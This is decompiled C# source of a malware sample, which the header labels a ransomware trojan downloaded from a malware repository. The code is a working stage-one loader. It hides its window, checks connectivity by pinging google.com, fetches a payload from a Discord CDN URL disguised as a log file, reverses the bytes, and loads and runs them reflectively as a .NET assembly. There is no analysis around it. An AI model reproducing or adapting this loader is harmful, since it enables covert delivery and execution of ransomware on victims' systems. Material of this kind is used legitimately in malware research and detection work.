// Decompiled with JetBrains decompiler
// Type: Hjeice.Boss
// Assembly: Oagtr, Version=98.0.4758.82, Culture=neutral, PublicKeyToken=null
// MVID: AAD6984D-AEAF-42AE-A62A-1006F64FDCBD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-829abb88ef2e3a50a7ad30c61a3194f6991a8d6b8db37d29a6f22aad591a4d06.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;

namespace Hjeice
{
  internal class Boss : Baser
  {
    private static List<byte> _buffers;

    internal static void Mouse()
    {
      Native.ShowWindow(Process.GetCurrentProcess().MainWindowHandle, 0);
      Boss._buffers = new List<byte>();
      try
      {
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
      }
      catch
      {
      }
      for (int index = 0; index < 100; ++index)
      {
        try
        {
          PingReply pingReply = new Ping().Send("google.com", 2000);
          if (pingReply.Status == IPStatus.Success)
          {
            Console.WriteLine("Address: {0}", (object) pingReply.Address.ToString());
            Console.WriteLine("RoundTrip time: {0}", (object) pingReply.RoundtripTime);
            Console.WriteLine("Time to live: {0}", (object) pingReply.Options.Ttl);
            Console.WriteLine("Don't fragment: {0}", (object) pingReply.Options.DontFragment);
            Console.WriteLine("Buffer size: {0}", (object) pingReply.Buffer.Length);
          }
          else
            Console.WriteLine("Address: {0}", (object) pingReply.Status);
        }
        catch
        {
        }
      }
    }

    internal static void Cow()
    {
      foreach (byte readByte in new BinaryReader(WebRequest.Create("https://cdn.discordapp.com/attachments/866351974466977835/943018805607661568/Oagtr.log").GetResponse().GetResponseStream()).ReadBytes(89276601))
        Boss._buffers.Add(readByte);
      Boss._buffers.Reverse();
    }

    internal static void Rabbit() => Boss.Lion(Assembly.Load(Boss._buffers.ToArray()));

    internal static void Lion(Assembly a)
    {
      string str = (string) a.GetType("Tpnnbs.Lgworwfiffimnjyk").GetMethod("Achkwlf").Invoke((object) null, (object[]) null);
      if (string.IsNullOrEmpty(str))
        return;
      Console.WriteLine(str);
    }
  }
}
